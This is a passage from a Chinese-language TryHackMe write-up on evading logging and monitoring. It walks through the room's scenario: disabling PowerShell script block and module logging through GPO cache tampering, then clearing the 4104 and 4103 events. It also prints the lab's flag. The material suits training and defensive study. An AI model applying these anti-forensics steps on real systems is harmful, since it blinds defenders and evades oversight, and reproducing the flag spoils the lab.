开始这个场景时，我们需要考虑我们所处的环境。我们知道他们正在监控 web 流量，但他们是如何做到的呢？是否启用了 PowerShell 日志记录？是否安装了 Sysmon？大多数这些问题可以通过手动枚举或查看设置来启用功能，如本课程中讨论的那样。<p></p><p>通过一些枚举，我们可以识别出启用了 PowerShell 脚本块和模块日志记录。解决这个问题的最佳方法是从我们的 PowerShell 会话的缓存中禁用这两个 GPO 设置。这可以通过使用桌面上的 GPO 绕过方法来完成，如任务 8 中讨论的那样。</p><p>太好了！从现在开始我们的会话是静默的，但当脚本运行时产生的那些恼人的日志怎么办？根据提供的信息，我们知道日志没有被转发，所以我们可以删除任何生成的 4104 或 4103 日志。因为互联网连接并不是来自 PowerShell，所以我们不需要担心在我们的静默会话中被打扰。为了删除日志，我们可以使用事件查看器 GUI 或 PowerShell 中的 Remove-EventLog。PowerShell 脚本块日志位于 Microsoft/Windows/PowerShell/Operational 或 Microsoft-Windows-PowerShell。然后可以在 GUI 中的操作下选择清除日志，或者运行 PowerShell cmdlet 来删除必要的日志。</p><p>此时，我们应该满足所有的要求：</p><p>禁用必要的日志记录
保持环境完整性
清除我们的痕迹
现在我们可以通过运行二进制文件 &quot;agent.exe&quot; 来测试我们的方法。如果正确实施，桌面上会返回一个标志。如果没有正确实施，“Binary leaked, you got caught” 会出现，意味着该二进制文件在某个时刻出现在了日志中，表示你未能成功完成这个场景。</p></div></div></details>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>请输入在执行二进制文件后从桌面获取的标志。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{51l3n7_l1k3_4_5n4k3}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion---结论">Conclusion - 结论<a href="#conclusion---结论" class="hash-link" aria-label="Direct link to Conclusion - 结论" title="Direct link to Conclusion - 结论">​</a></h2>
<p>正如本课程中多次提到的，规避事件检测的主要目标是在尽可能保持环境干净和完整的同时，防止会话或代码被记录。</p>
<p>我们已经介绍了几种显著的技术，其中大多数方法都比较激进。要获得恰当水平的“正常”日志，您需要修改或结合其中的几种脚本，以操控其他正常功能。</p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/PgUp-code/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Evading Logging and Monitoring - 绕过日志记录和监控.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Runtime Detection Evasion - 运行时检测规避"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Runtime Detection Evasion - 运行时检测规避</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Living Off the Land - 利用现成工具"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Living Off the Land - 利用现成工具</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#introduction---简介" class="table-of-contents__link toc-highlight">Introduction - 简介</a><ul><li><a href="#学习目标" class="table-of-contents__link toc-highlight">学习目标</a></li></ul></li><li><a href="#event-tracing---事件追踪" class="table-of-contents__link toc-highlight">Event Tracing - 事件追踪</a></li><li><a href="#approaches-to-log-evasion---日志规避方法" class="table-of-contents__link toc-highlight">Approaches to Log Evasion - 日志规避方法</a></li><li><a href="#tracing-instrumentation---事件跟踪仪器" class="table-of-contents__link toc-highlight">Tracing Instrumentation - 事件跟踪仪器</a></li><li><a href="#reflection-for-fun-and-silence---反射乐趣与沉默" class="table-of-contents__link toc-highlight">Reflection for Fun and Silence - 反射：乐趣与沉默</a></li><li><a href="#patching-tracing-functions---补丁跟踪函数" class="table-of-contents__link toc-highlight">Patching Tracing Functions - 补丁跟踪函数</a></li><li><a href="#providers-via-policy---通过策略的提供者" class="table-of-contents__link toc-highlight">Providers via Policy - 通过策略的提供者</a></li><li><a href="#group-policy-takeover---组策略接管" class="table-of-contents__link toc-highlight">Group Policy Takeover - 组策略接管</a></li><li><a href="#abusing-log-pipeline---滥用日志管道" class="table-of-contents__link toc-highlight">Abusing Log Pipeline - 滥用日志管道</a></li><li><a href="#real-world-scenario---实际场景" class="table-of-contents__link toc-highlight">Real World Scenario - 实际场景</a></li><li><a href="#conclusion---结论" class="table-of-contents__link toc-highlight">Conclusion - 结论</a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">No Copyright © 2025 This is just PgDn's Notes, Sorry. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>